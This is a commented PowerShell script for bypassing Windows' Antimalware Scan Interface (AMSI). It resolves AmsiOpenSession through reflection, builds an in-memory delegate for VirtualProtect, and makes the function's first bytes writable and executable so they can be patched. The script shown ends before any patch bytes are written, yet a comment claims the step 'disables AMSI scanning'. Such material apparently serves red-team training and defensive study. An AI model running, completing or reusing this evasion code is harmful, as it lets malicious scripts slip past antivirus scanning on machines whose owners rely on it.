# Gets the mem addr of a native function exported by a Windows DLL
function LookupFunc {
	Param ($moduleName, $functionName)

# Loads the System.dll assembly
# Filters for Microsoft.Win32.UnsafeNativeMethods
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

$tmp=@()

# Used to get an address of a function
$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}

# Gets a handle to a loaded DLL module
# This is then used to get the function's address
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}


# Creates a delegate type matching the signature of a native function
function getDelegateType {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

# Uses .NET reflection to define a new dynamic assembly & module 
# This is done in memory
# Defines a new delegate that inherits from MulticastDelegate
	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

# Defines a constructor on this delegate type
      $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    
# Defines an Invoke method on this delegate type
      $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
	
# Return the created delegate type
return $type.CreateType()
}

# Call LookupFunc to get the address of AmsiOpenSession
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0

# Changes the memory protection of the first 3 bytes to rwx
# This disables AMSI scanning by modifying the function's code at runtime
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

